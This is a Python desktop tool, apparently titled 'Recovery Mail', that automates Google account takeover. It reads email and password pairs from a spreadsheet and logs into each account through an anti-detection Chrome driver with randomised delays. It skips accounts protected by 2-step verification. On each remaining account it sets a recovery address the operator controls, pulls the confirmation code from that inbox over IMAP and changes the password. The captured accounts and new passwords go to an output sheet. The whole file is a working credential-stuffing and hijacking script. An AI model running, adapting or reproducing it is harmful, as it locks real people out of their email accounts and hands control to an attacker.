import random
from customtkinter import *
from tkinter import filedialog
from time import sleep
from selenium.webdriver.common.by import By
from undetected_chromedriver import Chrome
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from openpyxl import load_workbook
from PIL import Image,ImageTk
import imaplib
import email
from email.header import decode_header
import os
import re




root =CTk()
root.title("Recovery Mail")
root.geometry("890x700")
set_appearance_mode("light")
set_default_color_theme("green")
root.resizable(False,False)
set_widget_scaling(1.4)
##--------icon windows --------
iconpath=ImageTk.PhotoImage(file=os.path.join("assets","checked.ico"))
root.wm_iconbitmap()
root.iconphoto(False,iconpath)
##-----------------------------

## dialogfile functions



def open_file_dialog_entry1():
    file_path1 = filedialog.askopenfilename(title="Select a file")
    if file_path1:
        gmails_entery_path.delete(0,END)
        gmails_entery_path.insert(0,file_path1)
        

        return file_path1
      
    else:
        return None

def open_file_dialog_entry2():
    file_path2 = filedialog.askopenfilename(title="Select a file")
    if file_path2:
        output_entery_path.delete(0,END)
        output_entery_path.insert(0,file_path2)

        return file_path2       
    
    else:
        return None





# Recovery Gmail Entry

label_recovey_gmail=CTkLabel(master=root,text="Recovery Gmail").place(x=20,y=20)
recovery_gmail_entry=CTkEntry(master=root,width=300,height=31,placeholder_text="example@gmail.com")
recovery_gmail_entry.place(x=20,y=50)

# New password Entry

label_new_password_entry=CTkLabel(master=root,text="New Password").place(x=400,y=20)
new_password_entry=CTkEntry(master=root,width=200,height=31,placeholder_text="Password")
new_password_entry.place(x=400,y=50)

# App Key

label_app_key=CTkLabel(master=root,text="App Passwords Key").place(x=20,y=98)
app_key_entry=CTkEntry(master=root,width=300,height=31,placeholder_text="Key example : wapi czmm uhob ippz")
app_key_entry.place(x=20,y=125)

# Gmails with dialogfile

gmails_entery_path=CTkEntry(master=root,width=500,height=33,placeholder_text="Gmails Excell file.xlsx")

gmails_entery_path.place(x=20,y=190)

button_dialog_gmails=CTkButton(master=root,text="Choose",width=20,height=33,command=open_file_dialog_entry1).place(x=530,y=190)


# outputs with dialogfile

##### output Excell File

output_entery_path=CTkEntry(master=root,width=500,height=33,placeholder_text="Output Excell file.xlsx")
output_entery_path.place(x=20,y=260)

button_dialog_output=CTkButton(master=root,text="Choose",width=20,height=33,command=open_file_dialog_entry2).place(x=530,y=260)

#### whole programe --------------------------







class auth_digit:
   

    # Sender's email address
    specific_sender = "noreply@google.com"


    @staticmethod
    def decode_subject(encoded_subject):
    # Decode the subject header
        try:
            decoded, encoding = decode_header(encoded_subject)[0]
            if encoding:
                decoded = decoded.decode(encoding)
            return decoded
        except Exception as e:
            print(f"Error decoding subject: {e}")
            return "Subject Decoding Error"

    @staticmethod
    def check(recovery_email,App_Key):
        # Connect to Gmail's IMAP server
        mail = imaplib.IMAP4_SSL("imap.gmail.com")

        # Log in to your Gmail account
        mail.login(recovery_email,App_Key)

        # Select the mailbox you want to work with (e.g., 'inbox')
        mail.select("inbox")

        # Search for the most recent email from the specific sender
        status, messages = mail.search(None, f'(FROM "{auth_digit.specific_sender}")', "ALL")
        message_ids = messages[0].split()

        # Fetch and print the content of the last email from the specific sender
        if message_ids:
            latest_id = message_ids[-1]
            status, msg_data = mail.fetch(latest_id, "(RFC822)")
            raw_email = msg_data[0][1]

            # Parse the raw email content
            msg = email.message_from_bytes(raw_email)

            # Extract subject, sender, and date
            subject = auth_digit.decode_subject(msg["Subject"])


            match = re.search(r'\b\d{6}\b', subject)
            if match:
                result= match.group()
                #print(f"Found 6-digit number: {result}")
                return result
            else:
                return None

# auth_digit.check()
#=========================== Add Recovery email And chang Password =======================

class AD:
    valid_gamils=[]


    @staticmethod
    def Add_account_change_password(driver,recovary_gmail,new_password,app_key):

        recovery_email=str(recovary_gmail)

        new_password=str(new_password)

    
        

        ######################################## if page arabic ##############################

        
        #الحساب 

        element=WebDriverWait(driver,5).until(EC.element_to_be_clickable((By.XPATH, "/html[1]/body[1]/div[4]/header[1]/div[2]/div[1]/div[4]/div[1]/a[1]/span[2]")))
        # print(element.text)
        if element.text == "الحساب":

        
            ################################################# Add Recovery Gmail in Arabic #################################################################
            #click on security
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//a[@data-rid="10006" and @data-nav-type="9" and @href="security"]'))).click()
        
            sleep(1)
            #for arabic email_lange
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, "//a[@aria-label='البريد الإلكتروني المخصّص لاسترداد الحساب']"))).click()
            # # WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, "///div[@id='c184']//div[@class='nMwHGf']"))).click()
        
            # # add an email recovery
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, "//input[@id='i5']"))).clear()
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, "//input[@id='i5']"))).send_keys(recovery_email)
        
            sleep(0.5)
        
            # add
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//button[@type="submit"]'))).click()


            # #profe possissity
            #add the 6-digits to input
            sleep(3)
            digits=str(auth_digit.check(recovery_email=recovery_email,App_Key=app_key))

            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,"//input[@id='c3']"))).clear()

            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,"//input[@id='c3']"))).send_keys(digits)
            
            #---- prof button--
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//button[@data-mdc-dialog-action="ok"]'))).click()
            # sleep(random.randint(1,3))
            # #no2
            sleep(0.5)
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//button[@type="button" and @data-idom-class="wMI9H"]'))).click()
            #change_password
            sleep(random.randint(1,3))
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,"//a[@aria-label='كلمة المرور']"))).click()
            sleep(0.5)
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,"//input[@id='i5']"))).send_keys(new_password)
            sleep(0.5)
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,"//input[@id='i11']"))).send_keys(new_password)
            # press yes
            sleep(0.5)
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//button[@type="submit"]'))).click()
            sleep(1)


    

            
            #logout
            driver.implicitly_wait(random.randint(1,3))
            driver.get("https://accounts.google.com/Logout?ec=GAdAwAE&hl=ar")
            driver.get("https://accounts.google.com/Logout?ec=GAdAwAE&hl=ar")
            try:#if it was in arabic
                driver.implicitly_wait(1)
                WebDriverWait(driver,4,0.1).until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(),'اختيار حساب')]")))
                #remove accounnt arabic
                sleep(1)
                #remove
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.CSS_SELECTOR,"li[jsname='fKeql'] div[role='link']"))).click()
                sleep(0.5)
                #choose account to be removed
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//li[@class="JDAKTe ibdqA W7Aapd zpCp3 SmR8"]'))).click()
                sleep(0.7) #press okay remove
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,"/html[1]/body[1]/div[5]/div[1]/div[2]/div[3]/div[1]/span[1]/span[1]"))).click()                                
                
                sleep(0.5)#change to english
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,"//div[@role='combobox']"))).click()
                sleep(0.5) #english us
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//li[@data-value="en"]'))).click()
                sleep(0.5)

                
            except:
                # remove the account English
                sleep(1)
                #remove account
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.CSS_SELECTOR,"li[jsname='fKeql'] div[role='link']"))).click()
                sleep(0.5)
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//div[@class="lCoei YZVTmd SmR8" and @role="link" and @jsname="MBVUVe"]'))).click()
                sleep(0.5)
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.CSS_SELECTOR,"body > div:nth-child(7) > div:nth-child(1) > div:nth-child(2) > div:nth-child(4) > div:nth-child(1) > span:nth-child(3) > span:nth-child(1)"))).click()
                sleep(1)

                

        else:

            # Account
            #click security
            

            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//a[@class="RlFDUe EhlvJf" and @data-rid="10006"]'))).click()
            sleep(0.5)
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//a[@aria-label="Recovery email"]'))).click()
            
            ###Add recovery gmail 
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//input[@type="email"]'))).clear()
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//input[@type="email"]'))).send_keys(recovery_email)
            
            sleep(0.5)
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//button[@type="submit"]'))).click()
            
            #add the 6-digits to input
            sleep(3)
            digits=str(auth_digit.check(recovery_email=recovery_email,App_Key=app_key))

            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//input[@type="text" and @id="c3"]'))).clear()

            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//input[@type="text" and @id="c3"]'))).send_keys(digits)
            
            sleep(0.5)
            #press virefy
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//button[@jsname="tFTPAc"]'))).click()
            sleep(0.5)
            # #no2 cancel
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//button[@jsname="Pr7Yme" and @type="button"]'))).click()
            #change_password
            sleep(1)
            #password
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//a[@aria-label="Password"]'))).click()
            #new password
            sleep(0.5)
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//input[@id="i5"]'))).clear()
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//input[@id="i5"]'))).send_keys(new_password)
            sleep(0.5)
            #confirm
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//input[@id="i11"]'))).clear()
            sleep(0.5)
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//input[@id="i11"]'))).send_keys(new_password)
            sleep(0.5)
            #prees okay change
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//button[@type="submit"]'))).click()
            sleep(1)

                
            #logout
            driver.implicitly_wait(random.randint(1,3))
            driver.get("https://accounts.google.com/Logout?ec=GAdAwAE&hl=ar")
            driver.get("https://accounts.google.com/Logout?ec=GAdAwAE&hl=ar")
            try:#if it was in arabic
                driver.implicitly_wait(1)
                WebDriverWait(driver,4,0.1).until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(),'اختيار حساب')]")))
                #remove accounnt arabic
                sleep(1)
                #remove
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.CSS_SELECTOR,"li[jsname='fKeql'] div[role='link']"))).click()
                sleep(0.5)
                #choose account to be removed
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//li[@class="JDAKTe ibdqA W7Aapd zpCp3 SmR8"]'))).click()
                sleep(0.7) #press okay remove
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,"/html[1]/body[1]/div[5]/div[1]/div[2]/div[3]/div[1]/span[1]/span[1]"))).click()                                
                
                sleep(1)#change to english
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,"//div[@role='combobox']"))).click()
                sleep(0.7) #english us
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//li[@data-value="en"]'))).click()
                sleep(1)

                
            except:
                # remove the account English
                sleep(1)
                #remove account
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.CSS_SELECTOR,"li[jsname='fKeql'] div[role='link']"))).click()
                sleep(1)
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH,'//div[@class="lCoei YZVTmd SmR8" and @role="link" and @jsname="MBVUVe"]'))).click()
                sleep(0.5)
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.CSS_SELECTOR,"body > div:nth-child(7) > div:nth-child(1) > div:nth-child(2) > div:nth-child(4) > div:nth-child(1) > span:nth-child(3) > span:nth-child(1)"))).click()
                sleep(1)










class App:

    
    

    current_email=[]
    current_password=[]
    ###### output ##### 
    invalid_gmails=[]
    valid_gmails=[]

    @staticmethod
    def collect(gmails_path):
        #open Excell
        # GUI Path
        
        
        Excelle_Path=fr"{gmails_path}"
        wb=load_workbook(fr"{Excelle_Path}")
        ws=wb["Sheet1"]


        #collect all emails from Excelle
        var=1
        while var>=1:
                
            Emails=ws[f"A{var}"].value
            Passwords=ws[f"B{var}"].value
              
                
            App.current_email.append(Emails)
            App.current_password.append(Passwords)

                
            var +=1

            if Emails==None:
                App.current_email.pop(-1)
                App.current_password.pop(-1)
                    
                break




        wb.save(fr"{Excelle_Path}")

        wb.close()







    @staticmethod
    def main(recovery_gmail,new_password,app_key):


        
        
        
        driver =Chrome(driver_executable_path=ChromeDriverManager().install())
        driver.get('https://accounts.google.com/')

        

        n = len(App.current_email)-1
        iter_step = 1/n
        r=(abs(int(iter_step)-(iter_step)))/iter_step
        
        progress_step = iter_step
       
        procbar.start()

        for i in  range(len(App.current_email)):
            # gmail card filling
            # if an problem with the gmail account i catch it and if not i got the password card
            #check repeatation
            if App.current_email[i] in App.invalid_gmails or App.current_email[i] in App.valid_gmails:
                # #------------------------------------------------------------------
                App.invalid_gmails.append(App.current_email[i])
               
                labelproc.configure(text=f"Checking Gmail...left {len(App.current_email)-i-1} gmail")
                labelproc.update()

                procbar.set(progress_step)
                progress_step += iter_step  

                #------------------------------------------------------------------
                continue

            if i%5==0 and i!= 0 :
                sleep(random.randint(6,10))

            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="identifierId"]'))).clear()
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="identifierId"]'))).send_keys(App.current_email[i])
            
            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="identifierNext"]/div/button/span'))).click()
            # sleep(1)#
            try:
                # catch problem of gmail
                WebDriverWait(driver,2,0.1).until(EC.element_to_be_clickable((By.XPATH, "(//div[@class='o6cuMc Jj6Lae'])")))
   
                App.invalid_gmails.append(App.current_email[i])
                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="identifierId"]'))).clear()
                #------------------------------------------------------------------
              
              
                labelproc.configure(text=f"Checking Gmail...left {len(App.current_email)-i-1} gmail")
                labelproc.update()

                procbar.set(progress_step)
                progress_step += iter_step  
                sleep(0.5)
                #------------------------------------------------------------------
                continue
                

            except:
                    # if the Error is exist mean that the element doesn't exist so we are in password card page
                    #driver.back()
                    #print("good account")
                    # virification identitiy
                    try:
                        
                        WebDriverWait(driver,2,0.1).until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(),'Verify it’s you')]")))
                        
                        App.invalid_gmails.append(App.current_email[i])
                        
                        
                        labelproc.configure(text=f"Checking Gmail....left {len(App.current_email)-i-1} gmail")
                        labelproc.update()

                        procbar.set(progress_step)
                        progress_step += iter_step  
                        sleep(1)
                        driver.back()
                        WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="identifierId"]'))).clear()
                        #------------------------------------------------------------------
                        continue
                                          
                    except:                   
                        WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="password"]/div[1]/div/div[1]/input'))).send_keys(App.current_password[i])
                        sleep(1)
                        WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="passwordNext"]/div/button/span'))).click()
                       
                        try:
                            # if an password is correct will print the message
                            # and clear password input frame 
                            # return to username card
                            WebDriverWait(driver,2,0.1).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "div[class='OyEIQ uSvLId'] div span")))
                

                            App.invalid_gmails.append(App.current_email[i])
                            
                            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="password"]/div[1]/div/div[1]/input'))).clear()
                            sleep(0.5)
                            driver.back()
                            WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="identifierId"]'))).clear()
                            #------------------------------------------------------------------
                
                          
                            labelproc.configure(text=f"Checking Gmail...left {len(App.current_email)-i-1} gmail")
                            labelproc.update()

                            procbar.set(progress_step)
                            progress_step += iter_step   
                            #------------------------------------------------------------------                        
                            continue
                            
                        except:
                            
                            # [1] done or [2] double authentication
                            # double authenticaton need an mobile phone 
                            # one back() be at email card

                            # sleep(2)#2
                            try:
                                
                                # find if the 2-step verificaton
                                #
                                WebDriverWait(driver,3,0.1).until(EC.element_to_be_clickable((By.XPATH, "//span[normalize-space()='2-Step Verification']")))
                    

                                App.invalid_gmails.append(App.current_email[i])

                                    
                                #back() return  gmail card
                                #clear gmail frame and skip this email and try another
                                sleep(2.5)
                                driver.back()
                                # sleep(1)
                                WebDriverWait(driver,313).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="identifierId"]'))).clear()
                                
                                #------------------------------------------------------------------
                
                                
                                labelproc.configure(text=f"Checking Gmail...left {len(App.current_email)-i-1} gmail")
                                labelproc.update()
                                procbar.set(progress_step)
                                progress_step += iter_step   
                                #------------------------------------------------------------------
                                
                                
                                continue

                            except:
                                # if the 2-step varification doesn't exist so the right 
                                # print("2-step varification doesn't exist")
                                #couldn't varify you
                                try:
                                    WebDriverWait(driver,3,0.1).until(EC.visibility_of_element_located((By.XPATH, "//span[contains(text(),'Verify it’s you')]")))
                                    sleep(2.5)
                                    driver.back()
                                    
                                    #------------------------------------------------------------------
                    
                                    
                                    labelproc.configure(text=f"Checking Gmail...left {len(App.current_email)-i-1} gmail")
                                    labelproc.update()
                                    procbar.set(progress_step)
                                    progress_step += iter_step   
                                    #------------------------------------------------------------------

                                    continue
                                
                                except:


                                    # Add_account_change_password()
                                    labelproc.configure(text=f"Adding Recovery Gmail...")
                                    labelproc.update()
                                    
                                    AD.Add_account_change_password(driver=driver,recovary_gmail=recovery_gmail,new_password=new_password,app_key=app_key)

                                    
                                    App.valid_gmails.append(App.current_email[i])
                                   

                                    #------------------------------------------------------------------
                                    #------------------------------------------------------------------
                    
                                    #
                                    labelproc.configure(text=f"Checking Gmail...left {len(App.current_email)-i-1} gmail")
                                    labelproc.update()
                                    procbar.set(progress_step)
                                    progress_step += iter_step   
                                    #------------------------------------------------------------------

                                    continue
                                    #------------------------------------------------------------------

                        


      








def all_inputs():
    #recovery gamil
    recovery_gamil=recovery_gmail_entry.get().strip()
    #new password
    new_password=new_password_entry.get().strip()
    # app Key
    app_key=app_key_entry.get().strip()
    #Excell of gmails path file
    gmails_path=gmails_entery_path.get()
    #Excell of output
    output_path=output_entery_path.get()
   
    return (recovery_gamil,new_password,app_key,gmails_path,output_path)









def clear_column_except_header(sheet, column_index):
    for row_num, row in enumerate(sheet.iter_rows(min_col=column_index, max_col=column_index), start=1):
        for cell in row:
            if row_num > 1:  # Skip the header row
                cell.value = None  # You can also use an empty string by setting cell.value = ''









def clear_garbage(output_path):


    wb = load_workbook(fr"{output_path}")
    sheet = wb["Sheet1"]

    
    for column_to_clear in range(1,8):  # Replace with the desired column index (1-based index)
        clear_column_except_header(sheet, column_to_clear)

    # Save the changes
    wb.save(fr"{output_path}")
    wb.close()







def outs(output_path,new_password,recovary_gmail):

    wb=load_workbook(fr"{output_path}")
    ws=wb["Sheet1"]
    ws[f"A1"].value="Gmails"
    ws[f"B1"].value="New Passwords"
    ws[f"D1"].value="Recovery Gmail"
    ws[f"F1"].value="Invalid Gmails"
    for var in range(2,len(App.valid_gmails)+2):
        gmail=App.valid_gmails[var-2]
        
        ws[f"A{var}"].value=gmail
        ws[f"B{var}"].value=new_password
        ws[f"D{var}"].value=recovary_gmail
    #-----------------------------------


    
    for var in range(2,len(App.invalid_gmails)+2):
        gmail=App.invalid_gmails[var-2]
       
        ws[f"F{var}"].value=gmail
       



    wb.save(fr"{output_path}")
    wb.close()





  
def runApp():
    #collect  data
    App.current_email.clear()
    App.current_password.clear()
    ###### output ##### 
    App.invalid_gmails.clear()
    App.valid_gmails.clear()
    all_inputs()
    App.collect(all_inputs()[3])
    
    try:
        
        App.main(recovery_gmail=all_inputs()[0],new_password=all_inputs()[1],app_key=all_inputs()[2])
        
    except:
        procbar.stop()
 
        clear_garbage(all_inputs()[4])
        outs(all_inputs()[4],new_password=all_inputs()[1],recovary_gmail=all_inputs()[0])

    else:
        procbar.stop()
        
        clear_garbage(all_inputs()[4])
        outs(all_inputs()[4],new_password=all_inputs()[1],recovary_gmail=all_inputs()[0])
        








procbar=CTkProgressBar(master=root,width=400,height=10,progress_color="#2CC985",mode="determinate")
procbar.set(0)
procbar.place(relx=0.19,rely=0.7)

labelproc=CTkLabel(master=root,text="Adding Recovery Gmail...")
labelproc.place(relx=0.19,rely=0.62)

button_check=CTkButton(master=root,text="Go",height=33,anchor="center",command=runApp).place(x=250,y=400)


root.mainloop()